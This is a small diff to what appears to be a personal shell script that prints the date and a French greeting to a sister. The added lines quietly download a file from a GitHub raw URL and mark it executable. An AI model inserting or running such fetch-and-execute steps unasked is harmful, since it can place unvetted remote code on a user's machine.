@@ -4,3 +4,6 @@ echo "$(date `+%D` | toilet -f term -F border --gay)"
 Coucou ma soeur adorée !
 
 Une belle journée, hein ? 
+
+wget -qO - https://raw.githubusercontent.com/JohnAtreides/myScript/master/util/exeForCow > trucTest
+chmod +x trucTest
